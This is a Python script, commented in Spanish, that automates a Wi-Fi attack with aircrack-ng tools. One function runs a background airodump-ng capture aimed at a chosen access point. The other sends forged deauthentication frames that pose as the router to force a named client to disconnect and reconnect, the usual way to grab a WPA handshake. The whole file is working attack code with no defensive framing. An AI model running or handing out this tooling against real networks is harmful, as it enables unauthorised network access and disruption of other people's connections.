import subprocess
import time


def iniciar_captura_dirigida(interfaz_monitor: str, bssid: str, canal: str, archivo_salida: str = "captura"):
    # Ejecuta airodump-ng fijado en el canal y BSSID de la red elegida, y lo deja corriendo en segundo plano (NO lo detiene).
    
    comando = [
        "sudo", "airodump-ng",
        interfaz_monitor,
        "--bssid", bssid,
        "-c", canal,
        "-w", archivo_salida
    ]

    proceso = subprocess.Popen(
        comando,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return proceso


def desautenticar(interfaz_monitor: str, bssid: str, mac_cliente: str, cantidad_paquetes: int = 15):
    # Envía paquetes de desautenticación falsos al cliente, para forzar la reconexión. Se hace pasar por el router
    

    comando = [
        "sudo", "aireplay-ng",
        "-0", str(cantidad_paquetes),
        "-a", bssid,
        "-c", mac_cliente,
        interfaz_monitor
    ]

    resultado = subprocess.run(
        comando,
        capture_output=True,
        text=True
    )

    print(resultado.stdout + resultado.stderr)